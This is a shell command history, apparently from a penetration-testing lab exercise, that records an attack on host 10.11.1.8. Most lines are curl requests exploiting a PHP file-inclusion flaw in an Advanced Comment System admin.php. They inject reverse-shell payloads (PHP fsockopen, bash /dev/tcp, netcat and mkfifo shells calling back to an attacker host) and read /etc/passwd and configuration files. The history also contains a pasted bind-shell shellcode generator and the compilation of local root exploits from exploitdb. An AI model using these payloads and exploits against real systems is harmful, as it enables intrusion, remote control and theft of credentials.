  220  2020-08-19 19:26  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",443);exec("/bin/sh echo connected ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  221  2020-08-19 19:27  php -r '$sock=fsockopen("192.168.182.128",443);exec("/bin/sh echo connected ");'
  222  2020-08-19 19:27  php -r '$sock=fsockopen("192.168.182.128",3333);exec("/bin/sh echo connected ");'
  223  2020-08-19 19:29  php -r '$sock=fsockopen("192.168.182.128",33031);exec("/bin/sh echo connected ");'
  224  2020-08-19 19:29  $ sudo nmap -sT -O localhost\n
  225  2020-08-19 19:33  php -r '$sock=fsockopen("192.168.182.128",3331);exec("/bin/sh echo connected ");'
  226  2020-08-19 19:33  php -r '$sock=fsockopen("127.0.0.1",3331);exec("/bin/sh echo connected ");'
  227  2020-08-19 19:35  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  228  2020-08-19 19:35  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&4 >&4 2>&4 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  229  2020-08-19 19:36  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&6 >&6 2>&6 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  230  2020-08-19 19:37  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&2 >&2 2>&2 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  231  2020-08-19 19:38  curl  --data php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&2 >&2 2>&2 ");' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  232  2020-08-19 19:39  curl  --data php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&3 >&3 2>&3 ");' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  233  2020-08-19 19:39  curl  --data php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&4 >&4 2>&4 ");' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  234  2020-08-19 19:45  curl -s --data php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&4 >&4 2>&4 ");' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  235  2020-08-19 19:46  curl  -d 'php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&4 >&4 2>&4 ");'' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  236  2020-08-19 19:49  curl  -d php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&4 >&4 2>&4 ");' "http://127.0.0.1"
  237  2020-08-19 19:49  curl  -d php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&3 >&3 2>&3 ");' "http://127.0.0.1"
  238  2020-08-19 19:50  curl  -d php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&3 >&3 2>&3 ");' "http://127.0.0.1:"
  239  2020-08-19 19:50  curl  -d php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&3 >&3 2>&3 ");' "http://127.0.0.1:80"
  240  2020-08-19 19:55  curl  -d php -r '$sock=fsockopen("192.168.182.128",80);exec("/bin/sh <&3 >&3 2>&3 ");' "http://127.0.0.1:80"
  241  2020-08-19 19:55  curl  -d php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&4 >&4 2>&4 ");' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  242  2020-08-19 19:56  curl  -d php -r '$sock=fsockopen("192.168.182.128",80);exec("/bin/sh <&4 >&4 2>&4 ");' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  243  2020-08-19 19:56  curl  -d php -r '$sock=fsockopen("192.168.182.128",80);exec("/bin/sh <&3 >&3 2>&3 ");' "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  244  2020-08-19 19:57  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",80);');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  245  2020-08-19 19:58  curl  --data php  "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  246  2020-08-19 19:58  curl  --data php -version "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  247  2020-08-19 19:59  curl  --data php –r ‘$sock=fsockopen(“2.2.2.2”,1234);exec(“/bin/sh –I <&3 >&3 2>&3”);’  "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  248  2020-08-19 20:07  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",34);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  249  2020-08-19 20:07  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",21);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  250  2020-08-19 20:07  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",22);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  251  2020-08-19 20:07  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",80);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  252  2020-08-19 20:07  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",443);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  253  2020-08-19 20:08  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",445);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  254  2020-08-19 20:08  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  255  2020-08-19 20:10  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh  ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  256  2020-08-19 20:10  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh -i <&3 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  257  2020-08-19 20:13  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh -i <&2 >&3 2>&3 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  258  2020-08-19 20:13  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh -i <&2 >&2 2>&2 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  259  2020-08-19 20:14  curl  --data "<?exec('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh -i <&2 >&2 2>&2 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  260  2020-08-19 20:14  curl  --data "<?exec('php -r '$sock=fsockopen("192.168.182.128",443);exec("/bin/sh -i <&2 >&2 2>&2 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  261  2020-08-19 20:14  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh -i <&1 >&1 2>&1 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  262  2020-08-19 20:22  sudoapt-get install python-pyftpdlib\n
  263  2020-08-19 20:22  sudo apt-get install python-pyftpdlib\n
  264  2020-08-19 20:22  sudo apt install python-pyftpdlib\n
  265  2020-08-19 20:28  /*\nUtility : Generate Payload PortBind Linux/x86\nAuthor  : Jonathan Salwan\nMail    : submit [shell-storm.org\n\n        More shellcodes in => http://www.shell-storm.org/shellcode/\n*/\n\nfunction syntax()\n        {\n        echo "\nSyntax:\nroot@laptop:/# php ./payload.php <port>\n\n";\n        }\n\nfunction linux86bind($port)\n                {\n                if($port > 65535 || $port < 4100){\n                        echo "Erreur Port\nSelect a port between 4100 and 65535\n";\n                        return false;\n                        }\n\n                $inser .= "\nchar shellcode[] = \n";\n                $inser .= "                     /* BindPort TCP/$port; Linux/x86; Gen:http://www.shell-storm.org */\n";\n                $inser .= "\n";\n                $inser .= "                     \x22\\x31\\xc0\\x31\\xdb\\xb0\\x17\\xcd\\x80\\x31\\xdb\\xf7\\xe3\\xb0\\x66\\x53\\x43\\x53\x22\n";\n                $inser .= "                     \x22\\x43\\x53\\x89\\xe1\\x4b\\xcd\\x80\\x89\\xc7\\x52\\x66\\x68\\x";\n\n                $res_port       = base_convert($port, 10, 16);\n\n                $length         = strlen($res_port)-1;\n                $i              = 1;\n\n                for($idx = 0; $idx < $length+1; $idx++)\n                {\n                $i++;\n                if($i == 4)\n                $inser .= "\\x";\n\n                $inser .= $res_port[$idx];\n                }\n\n                $inser .= "\\x43\\x66\\x53\x22\n";\n                $inser .= "                     \x22\\x89\\xe1\\xb0\\x10\\x50\\x51\\x57\\x89\\xe1\\xb0\\x66\\xcd\\x80\\xb0\\x66\\xb3\\x04\x22\n";\n                $inser .= "                     \x22\\xcd\\x80\\x50\\x50\\x57\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x89\\xd9\\x89\\xc3\\xb0\x22\n";\n                $inser .= "                     \x22\\x3f\\x49\\xcd\\x80\\x41\\xe2\\xf8\\x51\\x68n/sh\\x68//bi\\x89\\xe3\\x51\\x53\\x89\x22\n";\n                $inser .= "                     \x22\\xe1\\xb0\\x0b\\xcd\\x80\x22\x3b\n";\n                $inser .= "\n";\n                $inser .= "     printf(\x22Length: %d\\n\x22,strlen(shellcode));\n";\n                $inser .= "     (*(void(*)()) shellcode)();\n";\n                $inser .= "\n";\n                $inser .= "\n";\n\n        return $inser;\n}\n\nif($argc < 2){\n        syntax();\n        return false;\n        }\n                $port = $argv[1];\n                echo linux86bind($port);\n\n?>\n
  266  2020-08-19 20:28  vim File.txt
  267  2020-08-19 20:28  rm File.txt
  268  2020-08-19 20:30  chmod +x shell.php
  269  2020-08-19 20:40  python -m SimpleHTTPServer 5000
  270  2020-08-19 20:43  curl  --data "<?system('cat index.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  271  2020-08-19 21:19  nc -nvlp 8080
  272  2020-08-19 21:20  curl  --data "<?system('history');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  273  2020-08-19 21:20  curl  --data "<?system('cat .bash_history');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  274  2020-08-19 23:03  curl  --data "<?system('cat config.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00" >> testing.txt
  275  2020-08-19 23:03  grep path testing.txt
  276  2020-08-19 23:03  grep A testing.txt
  277  2020-08-19 23:14  git commit -m "working on .8 with updates"
  278  2020-08-19 23:18  curl http://10.11.1.8/internal/advanced_comment_system
  279  2020-08-19 23:18  curl http://10.11.1.8/internal/advanced_comment_system/admin.php
  280  2020-08-19 23:21  grep Selecting database failed testing.txt
  281  2020-08-19 23:22  vim testing.txt
  282  2020-08-19 23:41  curl  --data "<?system('cat config.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  283  2020-08-20 00:15  curl  --data "<?system('/etc/passwd');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  284  2020-08-20 00:16  curl  --data "<?system('cat /etc/passwd');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%0"
  285  2020-08-20 00:17  \ll
  286  2020-08-20 00:47  cat testing.txt
  287  2020-08-20 00:47  ftp 10.11.1.8
  288  2020-08-20 00:51  curl  --data "<?system('cat /etc/passwd');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  289  2020-08-20 01:49  curl -u
  290  2020-08-20 01:50  curl http://localhost:5000/shell.php
  291  2020-08-20 01:52  curl -d  http://localhost:5000/shell.php
  292  2020-08-20 01:55  python -m SimpleHTTPServer 192.168.182.128:5000
  293  2020-08-20 01:58  python -m SimpleHTTPServer 5000 --bind 192.168.182.128
  294  2020-08-20 04:00  ^[[200~'<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.104/4444 0>&1 2>&1"); ?>' -X input
  295  2020-08-20 04:00  '<?php echo shell_exec("bash -i >& /dev/tcp/10.11.0.104/4444 0>&1 2>&1"); ?>' -X input
  296  2020-08-20 04:01  echo shell_exec("bash -i >& /dev/tcp/10.11.0.104/4444 0>&1 2>&1");  -X input
  297  2020-08-20 04:01  shell_exec("bash -i >& /dev/tcp/10.11.0.104/4444 0>&1 2>&1");  -X input
  298  2020-08-20 04:31  ping 192.168.182.128
  299  2020-08-20 04:32  netat
  300  2020-08-20 05:30  ping 10.11.1.8
  301  2020-08-20 05:30  tcp 
  302  2020-08-20 05:30  tcpdump
  303  2020-08-20 05:30  sudo tcpdump
  304  2020-08-20 06:49  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",631);exec("/bin/sh -i <&2 >&3 2>&2 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  305  2020-08-20 06:50  curl  --data "<?system('php -r $sock=fsockopen("192.168.182.128",1234);');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  306  2020-08-20 06:51  curl  --data "<?system('php -r $sock=fsockopen("10.11.1.8",1234);');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  307  2020-08-20 06:51  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh <&5 >&5 2>&5 ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  308  2020-08-20 06:52  curl  --data php –r $sock=fsockopen(“2.2.2.2”,1234);exec(“/bin/sh –I <&3 >&3 2>&3”);  "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  309  2020-08-20 06:52  curl  --data "<?system('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh echo connected ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  310  2020-08-20 06:53  curl  --data "<?system('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh echo connected ");'');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  311  2020-08-20 06:54  curl  --data "<?system('nc -c bash 192.168.182.128 21');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  312  2020-08-20 06:55  curl  --data "<?system('nc -c bash 10.11.1.8 1234');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  313  2020-08-20 06:56  curl  --data "<?system('nc -lvnp  1234');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  314  2020-08-20 06:58  curl  --data "<?system('nc -v');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  315  2020-08-20 06:58  netcat
  316  2020-08-20 06:58  nc --help
  317  2020-08-20 06:58  curl  --data "<?system('nc -h');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  318  2020-08-20 07:00  nc ng
  319  2020-08-20 07:09  curl -X POST --data "<?php echo shell_exec('id'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  320  2020-08-20 07:09  curl -X POST --data "<?php echo shell_exec('nc'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  321  2020-08-20 07:09  curl -X POST --data "<?php echo shell_exec('nc -h'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  322  2020-08-20 07:13  curl -X POST --data "<?php echo shell_exec('curl -h'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  323  2020-08-20 07:13  curl -X POST --data "<?php echo shell_exec('nc -e /bin/bash 192.168.1.82 31337'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  324  2020-08-20 07:17  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  325  2020-08-20 07:17  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&2 >&2 2>&2");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  326  2020-08-20 07:17  nc -vn 10.11.1.8 1234
  327  2020-08-20 07:18  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&2 >&2 2>&2");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  328  2020-08-20 07:19  nc -nvlp 1234
  329  2020-08-20 07:19  ss | grep 1234
  330  2020-08-20 07:19  ss -p | grep 1234
  331  2020-08-20 07:20  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("192.168.182.128",1010);exec("/bin/sh -i <&2 >&2 2>&2");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  332  2020-08-20 07:20  ss -p | grep 1010
  333  2020-08-20 07:20  nc -nvlp 1010
  334  2020-08-20 07:20  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("192.168.182.128",4444);exec("/bin/sh -i <&2 >&2 2>&2");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  335  2020-08-20 07:22  curl -X POST --data "<?php echo shell_exec('python'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  336  2020-08-20 07:22  curl -X POST --data "<?php echo shell_exec('cat lol >> lol'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  337  2020-08-20 07:22  curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  338  2020-08-20 07:24  rm '2);'\'''\''); ?>
  339  2020-08-20 07:25  rm -rf '2);'\'''\''); ?>
  340  2020-08-20 07:25  vim targeted
  341  2020-08-20 07:26  searchspolit php
  342  2020-08-20 07:26  searchsploit php re
  343  2020-08-20 07:26  searchsploit php rev
  344  2020-08-20 07:26  searchsploit  reverse shell
  345  2020-08-20 07:33  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh -i <&2 >&2 2>&2");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  346  2020-08-20 07:33  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("192.168.182.128",1234);exec("/bin/sh -i <&3 >&3 2>&3");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  347  2020-08-20 07:33  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&3 >&3 2>&3");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  348  2020-08-20 07:33  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&4 >&3 2>&3");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  349  2020-08-20 07:34  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&3 >&4 2>&3");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  350  2020-08-20 07:34  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&3 >&4 2>&4");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  351  2020-08-20 07:34  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&4 >&4 2>&4");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  352  2020-08-20 07:34  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&5 >&4 2>&4");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  353  2020-08-20 07:34  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&6 >&4 2>&4");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  354  2020-08-20 07:34  curl -X POST --data "<?php echo shell_exec('php -r '$sock=fsockopen("10.11.1.8",1234);exec("/bin/sh -i <&7 >&4 2>&4");''); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  355  2020-08-20 07:39  nc -nvlp 4444
  356  2020-08-20 07:39  curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/10.11.1.8/4444 0>&1'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  357  2020-08-20 07:42  curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/192.168.182.128/4444 0>&1'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  358  2020-08-20 07:45  nc -nvlp 80
  359  2020-08-20 07:46  curl -X POST --data "<?php echo shell_exec('nc -e /bin/sh 192.168.182.128 80 '); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  360  2020-08-20 07:46  curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/192.168.182.128/800>&1'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  361  2020-08-20 07:53  curl -X POST --data "<?php echo shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.182.128 1234 >/tmp/f'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  362  2020-08-20 07:53  curl -X POST --data "<?php echo shell_exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.182.128 4444 >/tmp/f'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  363  2020-08-20 08:23  curl -X POST --data "<?php echo shell_exec('nc -e /bin/sh 192.168.182.128 4444 '); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  364  2020-08-20 08:29  rm '2);'\'''\''); ?>'
  365  2020-08-20 08:29  git commit -m ".8 being a bitch trying shell working, started using brupo"
  366  2020-08-20 08:29  git commit -m ".8 being a bitch trying shell working, started using brupo"ush
  367  2020-08-20 08:30  sudo 0s
  368  2020-08-20 18:42  sudo nc -nvlp 80
  369  2020-08-20 18:42  curl -X POST --data "ls" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  370  2020-08-20 18:43  curl -X POST --data "asdfsdfs" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  371  2020-08-20 18:44  curl -X POST --data "ls?" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  372  2020-08-20 18:44  curl -X POST --data ls "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  373  2020-08-20 19:03  curl -X POST --data "<?php echo shell_exec('php -r'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  374  2020-08-20 19:10  #python -m SimpleHTTPServer 5000
  375  2020-08-20 19:11  chmod +x rshell.txt
  376  2020-08-20 19:11  #python -m SimpleHTTPServer 80
  377  2020-08-20 19:14  python -m SimpleHTTPServer 80 --bind 192.168.182.128
  378  2020-08-20 19:16  vim rshell.txt
  379  2020-08-20 19:39  locate / | grep vulnerabilities
  380  2020-08-20 19:45  sudo python -m SimpleHTTPServer 443 --bind 192.168.182.128
  381  2020-08-20 20:02  curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/192.168.182.128/80>&1'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  382  2020-08-20 20:02  curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=%00"
  383  2020-08-20 20:02  curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=lol%00"
  384  2020-08-20 20:29  curl -X POST --data "<?php echo shell_exec('bash -i >& /dev/tcp/192.168.182.128/80>&1'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://inputs%00"
  385  2020-08-20 20:31  sudo python -m SimpleHTTPServer 
  386  2020-08-20 20:32  mkdir tmp
  387  2020-08-20 20:32  mv lol.sh rshell.txt shell.php tmp
  388  2020-08-20 20:33  scd tmp
  389  2020-08-20 20:33  cd tmp/ll
  390  2020-08-20 20:33  cd tmp/
  391  2020-08-20 20:40  cat tmp s
  392  2020-08-20 20:40  cat tmp/rshell.txt
  393  2020-08-20 20:48  sudo lreboot
  394  2020-08-20 21:03  xcd
  395  2020-08-20 21:03  cd oscq
  396  2020-08-20 21:07  sudo apt install tree
  397  2020-08-20 21:46  nc -vn 10.11.1.8/4444
  398  2020-08-20 21:46  nc -vn 10.11.1.8
  399  2020-08-20 21:46  nc -vn 10.11.1.8 4444
  400  2020-08-20 21:46  nc -vn 10.11.1.8 80
  401  2020-08-20 21:46  nc -vn 10.11.1.8 
  402  2020-08-20 21:47  ./shell.php
  403  2020-08-20 22:16  curl -X POST --data "<?php echo shell_exec('ls'); ?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://inputs%00"
  404  2020-08-20 22:17  curl  --data "<?system('ls');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  405  2020-08-20 22:21  sudo timedatectl set-timezone UTC\n
  406  2020-08-20 23:16  cat shell.php
  407  2020-08-20 23:30  sudo python -m SimpleHTTPServer 80 --bind 192.168.182.128
  408  2020-08-20 23:35  cd tmpq
  409  2020-08-20 23:35  sudo python -m SimpleHTTPServer 80 192.168.182.128
  410  2020-08-20 23:47  service iptables status
  411  2020-08-20 23:47  sudo service iptables status
  412  2020-08-20 23:48  sudo  iptables -F
  413  2020-08-20 23:49  lcd tmp
  414  2020-08-21 00:13  service apache2 start\n
  415  2020-08-21 00:13  sudo service apache2 start\n
  416  2020-08-21 00:18  vim hse
  417  2020-08-21 00:20  sudo python -m SimpleHTTPServer 80 
  418  2020-08-21 00:29  sudo git clone https://github.com/rebootuser/LinEnum.git
  419  2020-08-21 00:36  sudo  cp LinEnum.sh /var/www/html\n
  420  2020-08-21 00:38  cp LinEnum.sh ~/OSCP/8/tmp
  421  2020-08-21 00:38  cd 8/tmp
  422  2020-08-21 00:59  cherrytre
  423  2020-08-21 01:13  cherrytree^[[200~sudo nc -nvlp 443   ~
  424  2020-08-21 01:16  vim CTF_template-1.ctb
  425  2020-08-21 02:28  vim /usr/share/exploitdb/exploits/linux/local/9545.c
  426  2020-08-21 02:35  gxx /usr/share/exploitdb/exploits/linux/local/9545.c
  427  2020-08-21 02:35  gcc /usr/share/exploitdb/exploits/linux/local/9545.c
  428  2020-08-21 02:36  gcc /usr/share/exploitdb/exploits/linux/local/9545.c -o root
  429  2020-08-21 02:36  mv root OSCP/8/tmp
  430  2020-08-21 02:38  rm root
  431  2020-08-21 02:38  gcc /usr/share/exploitdb/exploits/linux/local/9545.c -o root.c
  432  2020-08-21 03:20  ./r
  433  2020-08-21 03:20  ./root.c
  434  2020-08-21 03:22  # /usr/share/exploitdb/exploits/linux/local/9545.c -o root.c
  435  2020-08-21 03:22  locate /usr | grep 42.c
  436  2020-08-21 03:39  vim /usr/share/exploitdb/exploits/linux_x86/local/9542.c
  437  2020-08-21 03:58  gcc /usr/share/exploitdb/exploits/linux_x86/local/9542.c
  438  2020-08-21 06:14  #gcc -Wall -m32 -mtune=i686 /usr/share/exploitdb/exploits/linux_x86/local/9542.c 
  439  2020-08-21 06:14  sudo apt-get install gcc-multilib
  440  2020-08-21 06:15  sudo apt-get install libx11-dev:i386 libx11-dev
